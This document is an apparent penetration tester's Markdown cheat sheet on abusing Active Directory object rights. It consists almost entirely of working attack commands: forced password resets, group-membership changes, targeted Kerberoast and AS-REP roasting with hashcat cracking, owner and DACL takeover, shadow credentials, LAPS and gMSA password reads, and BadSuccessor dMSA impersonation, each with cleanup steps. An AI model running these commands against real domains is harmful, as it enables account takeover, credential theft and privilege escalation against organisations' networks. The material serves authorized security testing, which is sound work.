# AD object rights and advanced paths

Per edge note: principal + right + exact target + original value. Check allow/deny, object-specific GUIDs, inheritance and the DC used ([PowerView ACL checks](powerview.md#object-acls)). A BloodHound edge is a lead, not a backup.

| Right | Use |
| --- | --- |
| `ForceChangePassword` | Reset the user's password |
| `GenericWrite` / `GenericAll` on a user | Set an SPN (targeted Kerberoast), pre-auth flag, key credentials |
| `GenericAll` on a group | Add yourself as a member |
| `WriteOwner` / `WriteDACL` | Take ownership / grant yourself rights (keep the original owner + ACL) |

## Password reset and group membership
```powershell
Set-DomainUserPassword -Identity <TARGET-USER> -AccountPassword (ConvertTo-SecureString '<NEW-PW>' -AsPlainText -Force)
net group "<TARGET-GROUP>" <USER> /add /domain
```
- A reset doesn't show the old password and can break encrypted user data and running services.
- Membership: save the original members; remove only what you added → [privileged-groups](privileged-groups.md#account-operators).

### From Kali, no Windows foothold needed
```bash
bloodyAD -u <USER> -p '<PW>' -d <DOMAIN.TLD> --host <DC-IP> set password '<TARGET-USER>' '<NEW-PW>'
net rpc user password '<TARGET-USER>' '<NEW-PW>' -U '<DOMAIN>\<USER>%<PW>' -S <DC-IP>
bloodyAD -u <USER> -p '<PW>' -d <DOMAIN.TLD> --host <DC-IP> add groupMember '<TARGET-GROUP>' '<USER>'
net rpc group addmem '<TARGET-GROUP>' '<USER>' -U '<DOMAIN>\<USER>%<PW>' -S <DC-IP>
```
- `net rpc user password`, not `net rpc password` — the subcommand lives under `user`.

## Targeted Kerberoast (SPN write)
AD module, SPN-write confirmed. Add one SPN, never replace the set:

```powershell
$DC = '<DC-FQDN>'
$Cred = Get-Credential -UserName '<DOMAIN>\<USER>' -Message 'Object read/write credential'
$Victim = Get-ADUser '<TARGET-USER>' -Server $DC -Credential $Cred -Properties servicePrincipalName -ErrorAction Stop
$OriginalSpns = @($Victim.servicePrincipalName | ForEach-Object { [string]$_ })
$ProofSpn = 'proof/<TARGET-USER>.<DOMAIN.TLD>'
setspn.exe -Q $ProofSpn
Set-ADUser $Victim -Server $DC -Credential $Cred -ServicePrincipalNames @{Add=$ProofSpn} -ErrorAction Stop
```
```bash
impacket-GetUserSPNs -dc-ip <DC-IP> -request-user <TARGET-USER> -outputfile target-tgs.txt '<DOMAIN.TLD>/<USER>'
hashcat -m 13100 target-tgs.txt /usr/share/wordlists/rockyou.txt
```
Remove only the added SPN:
```powershell
Set-ADUser $Victim -Server $DC -Credential $Cred -ServicePrincipalNames @{Remove=$ProofSpn} -ErrorAction Stop
```
- Continue only if the `setspn -Q` shows the proof SPN is unused.

### From Kali, no Windows foothold needed
Without a Windows foothold, `GetUserSPNs.py -request-user` just returns "No entries found" — the account has no SPN to request a ticket for. Write one first:
```bash
bloodyAD -u <USER> -p '<PW>' -d <DOMAIN.TLD> --host <DC-FQDN> -k set object '<TARGET-USER>' servicePrincipalName -v 'proof/<TARGET-USER>.<DOMAIN.TLD>'
impacket-GetUserSPNs -dc-ip <DC-IP> -request-user '<TARGET-USER>' -outputfile target-tgs.txt '<DOMAIN.TLD>/<USER>'
hashcat -m 13100 target-tgs.txt /usr/share/wordlists/rockyou.txt
```
Cleanup (same command without `-v`, deletes the attribute — only safe if the account had no SPN before):
```bash
bloodyAD -u <USER> -p '<PW>' -d <DOMAIN.TLD> --host <DC-FQDN> -k set object '<TARGET-USER>' servicePrincipalName
```

## Targeted AS-REP (UAC write)
Read the current `userAccountControl` first. If `DONT_REQ_PREAUTH` is already set, just collect.

```bash
bloodyAD -u <USER> -p '<PW>' -d <DOMAIN.TLD> --host <DC-IP> add uac <TARGET-USER> -f DONT_REQ_PREAUTH
impacket-GetNPUsers <DOMAIN.TLD>/<TARGET-USER> -dc-ip <DC-IP> -no-pass -format hashcat
bloodyAD -u <USER> -p '<PW>' -d <DOMAIN.TLD> --host <DC-IP> remove uac <TARGET-USER> -f DONT_REQ_PREAUTH
```
- Username is a positional arg for `GetNPUsers`; `-request-user` belongs to `GetUserSPNs`.

## Owner and DACL
```bash
impacket-owneredit -dc-ip <DC-IP> -action read -target <TARGET> '<DOMAIN.TLD>/<USER>:<PW>'
impacket-dacledit -dc-ip <DC-IP> -action backup -file target-dacl.bak -target <TARGET> '<DOMAIN.TLD>/<USER>:<PW>'
impacket-owneredit -dc-ip <DC-IP> -action write -new-owner <USER> -target <TARGET> '<DOMAIN.TLD>/<USER>:<PW>'
impacket-dacledit -dc-ip <DC-IP> -action write -rights FullControl -principal <USER> -target <TARGET> '<DOMAIN.TLD>/<USER>:<PW>'
```
Restore, DACL first, then ownership:
```bash
impacket-dacledit -dc-ip <DC-IP> -action restore -file target-dacl.bak '<DOMAIN.TLD>/<USER>:<PW>'
impacket-owneredit -dc-ip <DC-IP> -action write -new-owner-sid <ORIGINAL-OWNER-SID> -target <TARGET> '<DOMAIN.TLD>/<USER>:<PW>'
```
- Ownership may not give a usable DACL right: OWNER RIGHTS ACEs and BlockOwnerImplicitRights (computer-derived objects) change that. Check the effective DACL.
- `-rights`: `FullControl`, `ResetPassword`, `WriteMembers`, `DCSync`, `Custom`.
- Restoring an old ACL erases concurrent edits.

## Sealed LDAP, object restore & newer primitives
`strongerAuthRequired` → Kerberos / sealed LDAP, or try LDAPS.
```bash
bloodyAD -u <USER> -p '<PW>' -d <DOMAIN.TLD> --host <DC-FQDN> get writable
```
Tombstone restore (write on the object + create-child in the destination OU):
```bash
bloodyAD -u <USER> -p '<PW>' -d <DOMAIN.TLD> --host <DC-FQDN> set restore <DELETED-OBJECT> \
  --newParent OU=<OU>,DC=<DOMAIN>,DC=<TLD>
```
## Shadow credentials
`GenericAll`/`GenericWrite` on a user, or a dedicated `AddKeyCredentialLink`. Needs writable `msDS-KeyCredentialLink` + PKINIT support on a DC (Server 2016+); AD CS is not required — `bloodyAD` does the PKINIT itself, no CA involved. Gives an NT hash and a TGT with no password cracking.

```bash
bloodyAD -u <USER> -p '<PW>' -d <DOMAIN.TLD> --host <DC-IP> add shadowCredentials '<TARGET>'
```
Cleanup — **omitting `--key` removes every KeyCredentialLink entry on the target, not just the one just added**; pass the sha256 key ID the `add` command printed:
```bash
bloodyAD -u <USER> -p '<PW>' -d <DOMAIN.TLD> --host <DC-IP> remove shadowCredentials '<TARGET>' --key '<KEY-SHA256>'
```
`certipy`/`pywhisker` alternative (useful when `bloodyAD`'s own PKINIT path fails, or AD CS is already in play): `certipy shadow auto` restores the original Key Credentials itself — no separate cleanup step.
```bash
certipy shadow auto -account '<TARGET>' -u '<USER>@<DOMAIN.TLD>' -p '<PW>' -dc-ip <DC-IP>
pywhisker.py -d <DOMAIN.TLD> -u '<USER>' -p '<PW>' --target '<TARGET>' -a add --export PFX --filename shadow-cred
certipy auth -pfx shadow-cred.pfx -dc-ip <DC-IP>
pywhisker.py -d <DOMAIN.TLD> -u '<USER>' -p '<PW>' --target '<TARGET>' -a remove -D <DEVICE-ID>
```
- `KDC_ERR_PADATA_TYPE_NOSUPP` → DC doesn't support PKINIT/KeyCredentialLink (needs Server 2016+).
- `pywhisker -a add` prints the `DEVICE-ID` to pass to `-a remove` later; it does not self-clean like `certipy shadow auto`.

### GenericWrite on a user: which path first
Shadow credentials first, roast (Kerberoast/AS-REP) second. Both roasts still need the password to crack — a non-crackable hash (rockyou miss) dead-ends there. Shadow creds gives the NT hash and a TGT directly, no cracking, as long as PKINIT is supported.
- After either, check the account's `MemberOf` before moving on: `Remote Management Users` means the hash alone is a WinRM shell → [remote-access](../enum/remote-access.md#winrm).

## LAPS / gMSA read
```bash
bloodyAD -u <USER> -p '<PW>' -d <DOMAIN.TLD> --host <DC-IP> get object '<HOSTNAME>$' --attr ms-Mcs-AdmPwd
bloodyAD -u <USER> -p '<PW>' -d <DOMAIN.TLD> --host <DC-IP> get object '<GMSA>$' --attr msDS-ManagedPassword
```
- `msDS-ManagedPassword` comes back pre-decoded (`NT` hash + base64 current password) — no separate gMSA-blob parsing step.
- Full LAPS attribute set (Windows LAPS JSON, encrypted variants), domain-wide gMSA enum, and ticket use: [managed-credentials](managed-credentials.md).

## BadSuccessor / dMSA
Needs: a DC2025 (Windows Server 2025 schema, dMSA Kerberos support) + a KDS root key already provisioned domain-wide + create rights for a new dMSA object somewhere. Creates a dMSA, points its `msDS-ManagedAccountPrecededByLink` at the victim, then S4U2self-impersonates the dMSA to get the victim's Kerberos keys back in the TGS — no password, no prior access to the victim at all.
```bash
bloodyAD -u <USER> -p '<PW>' -d <DOMAIN.TLD> --host <DC-IP> add badSuccessor '<DMSA-NAME>' -t 'CN=Administrator,CN=Users,DC=<DOMAIN>,DC=<TLD>'
```
- Auto-picks a writable OU if `--ou` is omitted: prefers `CN=Managed Service Accounts`, else any OU where you can create a child object, grant yourself rights via `WriteDACL`, or take ownership via `WriteOwner`.
- `-t` is repeatable: `-t '<TARGET-DN>' -t '<TARGET-DN2>'` to supersede multiple principals in one shot.
- `NTE_NO_KEY` → no KDS root key on the domain yet (`Add-KdsRootKey -EffectiveImmediately` from a DC, not a Kali-side fix).
- `--prepatch` if the DC is below build `26100.4946` (doesn't yet write `msDS-Superseded*` attributes on the target, needed post-fix to avoid a generic Kerberos error).
